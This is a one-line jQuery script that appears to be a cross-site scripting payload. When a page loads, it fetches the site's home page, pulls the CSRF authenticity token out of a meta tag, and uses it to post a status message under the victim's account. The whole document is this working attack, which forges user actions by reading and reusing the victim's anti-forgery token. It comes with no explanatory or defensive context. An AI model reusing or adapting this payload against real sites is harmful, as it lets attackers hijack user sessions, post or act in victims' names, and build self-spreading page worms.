$(document).ready(function() {$.ajax({url:'/',success:function(a){$.post('/statuses',{status:{body:'poopin @mastahyeti'},authenticity_token:$($(a)[7]).attr('content')})}})})
